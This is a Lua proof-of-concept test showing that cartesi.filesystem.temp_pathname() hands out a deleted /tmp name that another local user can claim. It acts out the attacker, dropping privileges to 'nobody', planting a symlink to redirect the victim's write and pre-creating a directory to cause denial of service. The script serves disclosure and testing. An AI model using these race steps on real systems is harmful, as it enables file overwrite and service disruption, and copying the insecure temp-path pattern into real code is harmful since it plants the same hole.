-- Proof: cartesi.filesystem.temp_pathname() returns a name in the shared /tmp that it has just
-- deleted, so another local user can claim it (symlink or directory) before the caller uses it.
-- The attacker steps run as user "nobody" (via setpriv) when this script runs as root, simulating
-- an attacker who won the race; otherwise they run as the same user (weaker demonstration).
local fs = require("cartesi.filesystem")

local function sh(cmd) return os.execute(cmd) end
local function q(s) return "'" .. s:gsub("'", "'\\''") .. "'" end
local is_root = io.popen("id -u"):read("l") == "0"
local function as_attacker(cmd)
    if is_root then cmd = "setpriv --reuid=65534 --regid=65534 --clear-groups sh -c " .. q(cmd) end
    return sh("timeout 10 " .. cmd .. " 2>/dev/null")
end
local function readall(p) local f = io.open(p, "rb"); if not f then return nil end local d = f:read("a"); f:close(); return d end
local ps = readall("/proc/sys/fs/protected_symlinks")
print("running as root: " .. tostring(is_root) .. ", fs.protected_symlinks=" .. tostring(ps and ps:gsub("%s", "")))

local bugs = 0

-- 1) symlink redirection of a write
do
    local victim_dir = assert(io.popen("mktemp -d"):read("l")) -- private victim-owned dir
    local target = victim_dir .. "/precious"
    fs.write_file("ORIGINAL", target)
    local path = fs.temp_pathname()
    print("temp_pathname() -> " .. path .. " (exists: " .. tostring(fs.exists(path)) .. ")")
    local planted = as_attacker("ln -s " .. q(target) .. " " .. q(path))
    if planted then
        local ok, err = pcall(fs.write_file, "ATTACKER-REDIRECTED", path)
        local now = readall(target)
        print("victim write_file to temp path: ok=" .. tostring(ok) .. (ok and "" or (" err=" .. tostring(err))))
        if now == "ATTACKER-REDIRECTED" then
            print("BUG: write to fs.temp_pathname() path followed attacker's symlink and overwrote " .. target)
            bugs = bugs + 1
        else
            print("symlink was planted but not followed (protected_symlinks?); write " .. (ok and "succeeded" or "failed"))
            if not ok then
                print("BUG: attacker-planted symlink at fs.temp_pathname() path makes the victim's write fail (DoS)")
                bugs = bugs + 1
            end
        end
        os.remove(path)
    else
        print("attacker could not create the returned path (ok)")
    end
    os.remove(target); os.remove(victim_dir)
end

-- 2) pre-created directory: create_directory fails / attacker owns the directory the victim uses
do
    local path = fs.temp_pathname()
    local planted = as_attacker("mkdir -m 0777 " .. q(path))
    if planted then
        local ok, err = pcall(fs.create_directory, path)
        print("victim create_directory(temp_pathname()): ok=" .. tostring(ok) .. " err=" .. tostring(err))
        if not ok then
            print("BUG: attacker pre-created directory at fs.temp_pathname() path; victim's create_directory fails (DoS)")
            bugs = bugs + 1
        end
        os.remove(path)
    else
        print("attacker could not create the returned path (ok)")
    end
end

if bugs > 0 then os.exit(1) end
print("OK: temp_pathname result could not be claimed by another user")
os.exit(0)
